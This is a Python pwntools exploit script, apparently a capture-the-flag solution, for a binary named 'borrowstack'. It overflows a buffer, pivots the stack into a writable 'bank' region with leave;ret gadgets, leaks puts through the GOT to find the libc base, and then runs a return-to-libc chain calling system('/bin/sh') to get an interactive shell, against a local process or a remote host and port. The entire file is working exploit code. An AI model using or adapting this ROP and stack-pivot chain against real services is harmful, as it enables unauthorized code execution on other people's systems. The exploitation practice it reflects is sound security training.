#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './borrowstack'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
bank = 0x601080

# gadget
prdi = 0x0000000000400703 # pop rdi ; ret
leave = 0x0400699 # leave ; ret
ppr = 0x0000000000400701 # pop rsi ; pop r15 ; ret

# elf, libc

# rop1
offset = 104-8
payload = 'A'*offset
payload += p64(bank-0x8+0x80) + p64(leave)
ru('ou want\n')

se(payload)

ru('Done!You can check and use your borrow stack now!\n')
pl2 = p64(bank+0x400)*16
pl2 += p64(ppr) + p64(bank+0x400) + p64(0xdeadbeef)
pl2 += p64(0x040068a)
se(pl2)

raw_input('go on')

pl3 = p64(bank-0x8+0x80)
pl3 += p64(prdi) + p64(elf.got['puts']) + p64(elf.sym['puts'])
pl3 += p64(0x0400680)
pl3 = pl3.ljust(0x100,'a')
se(pl3)

puts = uu64(rc(6))
libc_base = puts - libc.sym['puts']
info_addr('libc_base',libc_base)
binsh = libc_base + libc.search('/bin/sh').next()
system = libc_base + libc.sym['system']

raw_input('go on')

pl22 = p64(bank+0x800)*16
pl22 += p64(ppr) + p64(bank+0x800) + p64(0xdeadbeef)
pl22 += p64(0x040068a)
se(pl22)

raw_input('go on')

pl4 = p64(bank+0x800)
pl4+= p64(0x40069a) + p64(prdi) + p64(binsh) + p64(system)
pl4 += p64(0xdeadbeef)
pl4 = pl4.ljust(0x100,'a')
sl(pl4)

p.interactive()

